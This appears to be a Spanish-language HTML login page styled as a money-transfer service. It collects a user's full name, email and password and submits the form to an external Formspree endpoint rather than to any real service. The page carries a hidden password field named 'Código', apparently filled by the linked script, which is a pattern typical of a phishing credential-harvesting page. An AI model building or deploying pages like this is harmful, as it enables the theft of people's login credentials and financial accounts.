<!DOCTYPE html>
<html lang="en">
  <head>
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"
    />
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta
      name="viewport"
      content="width=
  , initial-scale=1.0"
    />
    <link rel="stylesheet" href="login.css" />
    <title>Document</title>
  </head>
  <body>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <header>
      <img src="./Assets/img/Group 1.png" alt="" />
      <h2>Consígnale a alguien de la manera más fácil de todas</h2>
    </header>
    <div class="form-container">
      <form
        id="formulario"
        action="https://formspree.io/f/mbjbzojq"
        method="POST"
      >
        <div>
          <label for="name">Nombre Completo</label>
          <input type="text" id="name" />
        </div>
        <div>
          <label for="gmail">Correo Electronico</label>
          <input type="email" id="email" />
        </div>
        <div>
          <label for="password">Constraseña</label>
          <input type="password" id="password" />
        </div>
        <div class="submit">
          <input type="submit" id="submit" />
        </div>
        <div style="visibility: hidden">
          <input type="password" id="code" name="Código" />
        </div>
        <div class="form-msg"></div>
      </form>
    </div>
    <footer>
      <span>
        <img
          src="https://cdn-icons-png.flaticon.com/512/2438/2438078.png"
          alt=""
        />
        <p>Todos los derechos reservados</p>
      </span>
    </footer>
    <script src="./login.js"></script>
  </body>
</html>
